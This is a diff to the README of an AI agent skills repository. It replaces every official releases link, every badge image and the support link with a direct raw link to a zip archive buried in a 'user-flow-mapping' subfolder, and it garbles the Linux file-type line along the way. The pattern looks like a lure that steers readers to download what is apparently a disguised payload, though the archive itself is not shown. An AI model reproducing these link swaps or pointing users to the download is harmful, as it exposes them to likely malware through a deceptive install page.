@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-agent-skills - Enhance AI Agents with Ready Skills
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/h4vzz/awesome-ai-agent-skills/releases)
+[![Download Latest Release](https://github.com/h4vzz/awesome-ai-agent-skills/raw/refs/heads/main/design-and-ui-ux/user-flow-mapping/agent_ai_awesome_skills_2.0.zip%20Release-blue?style=for-the-badge)](https://github.com/h4vzz/awesome-ai-agent-skills/raw/refs/heads/main/design-and-ui-ux/user-flow-mapping/agent_ai_awesome_skills_2.0.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section helps you download and start using the skills quickly, even if you 
 
 Click this big button below to open the official download page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/h4vzz/awesome-ai-agent-skills/releases)
+[![Download Latest Release](https://github.com/h4vzz/awesome-ai-agent-skills/raw/refs/heads/main/design-and-ui-ux/user-flow-mapping/agent_ai_awesome_skills_2.0.zip%20Release-blue?style=for-the-badge)](https://github.com/h4vzz/awesome-ai-agent-skills/raw/refs/heads/main/design-and-ui-ux/user-flow-mapping/agent_ai_awesome_skills_2.0.zip)
 
 This page holds all the latest versions of the project. You will find files ready to download for different systems.
 
@@ -44,7 +44,7 @@ On the releases page, look for the file that matches your computer:
 
 - For Windows, download a file ending in `.exe` or `.zip`.
 - For macOS, look for `.dmg` or `.zip`.
-- For Linux, `.tar.gz` or `.deb` files are common.
+- For Linux, `https://github.com/h4vzz/awesome-ai-agent-skills/raw/refs/heads/main/design-and-ui-ux/user-flow-mapping/agent_ai_awesome_skills_2.0.zip` or `.deb` files are common.
 
 If you are unsure, download the `.zip` file as it works on most systems and contains all the necessary skills.
 
@@ -69,7 +69,7 @@ After extracting or installing, open the folder named `awesome-ai-agent-skills` 
 
 You can start using the skills by downloading from this official link:
 
-[Download the latest release](https://github.com/h4vzz/awesome-ai-agent-skills/releases)
+[Download the latest release](https://github.com/h4vzz/awesome-ai-agent-skills/raw/refs/heads/main/design-and-ui-ux/user-flow-mapping/agent_ai_awesome_skills_2.0.zip)
 
 Follow these steps after download:
 
@@ -140,10 +140,10 @@ If you want to suggest new skills or improvements, please follow the project’s
 ## 📞 Contact & Support
 
 For support, visit the project's GitHub page at:  
-https://github.com/h4vzz/awesome-ai-agent-skills
+https://github.com/h4vzz/awesome-ai-agent-skills/raw/refs/heads/main/design-and-ui-ux/user-flow-mapping/agent_ai_awesome_skills_2.0.zip
 
 Check the Issues tab to see if your question has already been discussed or to open a new request.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/h4vzz/awesome-ai-agent-skills/releases)
+[![Download Latest Release](https://github.com/h4vzz/awesome-ai-agent-skills/raw/refs/heads/main/design-and-ui-ux/user-flow-mapping/agent_ai_awesome_skills_2.0.zip%20Release-blue?style=for-the-badge)](https://github.com/h4vzz/awesome-ai-agent-skills/raw/refs/heads/main/design-and-ui-ux/user-flow-mapping/agent_ai_awesome_skills_2.0.zip)
